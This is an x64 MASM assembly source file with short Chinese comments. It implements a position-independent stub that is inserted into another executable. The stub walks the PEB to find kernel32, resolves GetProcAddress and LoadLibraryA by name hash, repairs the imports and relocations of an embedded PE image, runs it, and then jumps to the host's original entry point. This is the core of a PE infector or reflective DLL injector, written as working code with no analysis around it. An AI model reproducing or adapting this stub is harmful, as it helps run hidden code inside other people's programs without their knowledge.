.data					;数据段	
.code					;代码段

insertdll proc
mov rax,cstart
mov rdx,cend
sub rdx,rax
mov qword ptr [rcx],rdx
ret
cstart:
mov rdx,1234567812345678h   ;入口
mov rcx,1234567812345678h   ;插入代码偏移
jmp rstart

findFunction:
mov rax,rcx
mov rbp,gs:[60h]
mov rbp,qword ptr [rbp+18h]
mov rbp,qword ptr [rbp+30h]
mov rbp,qword ptr [rbp]
mov rbp,qword ptr [rbp]
mov rbp,qword ptr [rbp+10h]	;kernel32
mov ecx, dword ptr [rbp + 3ch] 
mov ecx, dword ptr [rbp + rcx + 88h]
add rcx, rbp
xor rdi, rdi
next_loop:
cmp edi, dword ptr [rcx + 18h]
jz findOut
mov ebx, dword ptr [rcx + 20h] 
add rbx, rbp
mov esi, dword ptr [rbx + rdi * 4]
add rsi, rbp
xor rdx, rdx
hash_loop: 
movsx rbx, byte ptr[rsi]
cmp bl,bh
jz compare_hash
ror rdx,7
add rdx,rbx
inc rsi
jmp hash_loop
compare_hash: 
cmp rax, rdx
jz next_out
inc rdi
jmp next_loop 
next_out:
mov ebx, dword ptr [rcx + 24h]
add rbx, rbp
movzx rdi, word ptr [rbx + 2 * rdi]
mov ebx, dword ptr [rcx + 1ch]
add rbx, rbp
mov eax, dword ptr [rbx + 4 * rdi]
add rax,rbp
ret
findOut:
xor rax, rax
ret

repairImport:
push rcx
mov rcx,2b3def2c9071f059h ;hash of GetProcAddress
call findFunction
pop rbp
cmp rax,0
jz repairImportQuit
push rax
mov rcx,0b22b0f2c5a666505h ;hash of LoadLibraryA
push rbp
call findFunction
pop rbp
push rax
cmp rax,0
jz repairImportOut

mov ebx, dword ptr [rbp + 3ch] 
mov ebx, dword ptr [rbp + rbx + 90h]
add rbx, rbp
import_loop:
mov ecx,dword ptr [rbx+0ch]
cmp rcx,0
jz repairImportOut
add rcx,rbp
mov rax,qword ptr [rsp]
sub rsp,30h
push rcx
call rax
add rsp,38h
mov rcx,rax
mov edi,dword ptr [rbx+10h]
add rdi,rbp
fit_loop:
mov rdx,qword ptr [rdi]
cmp rdx,0
jz fit_out
add rdx,rbp
add rdx,2
mov rax,qword ptr [rsp+8]
push rcx
sub rsp,30h
push rcx
push rdx
call rax
add rsp,40h
pop rcx
mov qword ptr [rdi], rax
add rdi, 8h
jmp fit_loop
fit_out:
add rbx,14h
jmp import_loop
repairImportOut:
add rsp,10h
repairImportQuit:
ret

repairReloc:
mov rbp,rcx
mov esi, dword ptr [rbp + 3ch]
add rsi, rbp
mov rdx, qword ptr [rsi + 30h]
mov edi, dword ptr [rsi + 0b4h]
mov esi, dword ptr [rsi + 0b0h]
add rsi, rbp
add rdi, rsi
reloc_loop:
cmp rsi,rdi
jz repairRelocOut
mov eax,dword ptr [rsi]
add rax,rbp
mov ebx,dword ptr [rsi + 4]
add rbx,rsi
add rsi,8h
r_loop:
cmp rsi,rbx
jz reloc_loop
movzx rcx,word ptr [rsi]
add rsi,2
cmp rcx,0
jz r_loop
and cx,0fffh
add rcx,rax
sub qword ptr [rcx],rdx
add qword ptr [rcx],rbp
jmp r_loop
repairRelocOut:
ret

rstart:
sub rsp,8h
mov rbp,gs:[60h]
mov rbp,[rbp+10h]
add rdx,rbp
add rcx,rbp
push rdx
push rcx
call repairImport
mov rcx, qword ptr [rsp]
call repairReloc
pop rcx

mov eax,dword ptr [rcx + 3ch]
mov eax,dword ptr [rcx + rax + 88h]
mov eax,dword ptr [rcx + rax + 1ch]
mov eax,dword ptr [rcx + rax]
add rax,rcx
sub rsp,28h
call rax
add rsp,28h
pop rdx
add rsp,8h
jmp rdx
cend:
ret
insertdll endp

end